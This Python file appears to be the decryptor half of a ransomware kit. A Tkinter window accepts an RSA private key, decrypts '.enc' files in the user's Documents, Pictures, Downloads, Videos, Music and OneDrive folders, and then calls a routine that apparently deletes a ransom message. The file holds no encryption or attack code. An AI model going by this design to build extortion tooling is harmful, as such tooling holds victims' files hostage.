import tkinter as tk
from tkinter import filedialog
from tkinter import scrolledtext
from tkinter import messagebox
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from concurrent.futures import ThreadPoolExecutor
import os
from message import delete_message

def decrypt_file(file_path, private_key):
    # Read the encrypted file
    with open(file_path, 'rb') as encrypted_file:
        iv = encrypted_file.read(16)
        encrypted_aes_key = encrypted_file.read(256)
        encrypted_data = encrypted_file.read()

    # Decrypt the AES key
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Decrypt the data with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv),
                    backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded_data = decryptor.update(
        encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = sym_padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(
        decrypted_padded_data) + unpadder.finalize()

    # Save the decrypted data
    original_path = file_path.rsplit('.enc', 1)[0]
    with open(original_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

     # Remove the encrypted file safely after decryption
    try:
        os.remove(file_path)
        print(f"Encrypted file {file_path} removed after decryption.")
    except OSError as e:
        print(f"Error: {file_path} : {e.strerror}")

def decrypt_directory(directory_path, private_key_pem_str):
    # Convert the private key string to a private key object
    private_key_bytes = private_key_pem_str.encode('utf-8')
    private_key = serialization.load_pem_private_key(
        private_key_bytes, password=None, backend=default_backend()
    )

    # Prepare a list of encrypted files
    encrypted_files = []
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file.endswith(".enc"):
                encrypted_files.append(os.path.join(root, file))

    # Use ThreadPoolExecutor to decrypt files concurrently
    with ThreadPoolExecutor() as executor:
        # Map each file to the decrypt_file function alongside the loaded private key
        executor.map(lambda file: decrypt_file(file, private_key), encrypted_files)

def main(private_key):
    # Example usage
    home_dir = os.path.expanduser('~')

    # Directories to target
    user_dirs = [
        os.path.join(home_dir, 'Documents'),
        os.path.join(home_dir, 'Pictures'),
        # os.path.join(home_dir, 'Desktop'),
        os.path.join(home_dir, 'Downloads'),
        os.path.join(home_dir, 'Videos'),
        os.path.join(home_dir, 'Music'),
        os.path.join(home_dir, 'OneDrive')
    ]

    for directory in user_dirs:
        if os.path.exists(directory):
            decrypt_directory(directory, private_key)
        else:
            print(f"Directory does not exist: {directory}")

    delete_message()

def decrypt_directory_with_key(private_key_str):
    # Convert the private key string to a private key object here
    # Use your existing decryption logic to decrypt the directory
    main(private_key_str)

def decrypt():
    private_key_str = text_area.get("1.0", tk.END)
    if not private_key_str.strip():
        messagebox.showerror("Error", "Please enter the private key.")
        return
    decrypt_directory_with_key(private_key_str)
    messagebox.showinfo("Success", "Decryption process is completed.")

# Create the main window
window = tk.Tk()
window.title("Decryption Tool")

# Create a text area for the private key input
text_area = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=40, height=10)
text_area.pack(pady=10)

# Create a decrypt button
decrypt_button = tk.Button(window, text="Decrypt", command=decrypt)
decrypt_button.pack(pady=5)

window.mainloop()
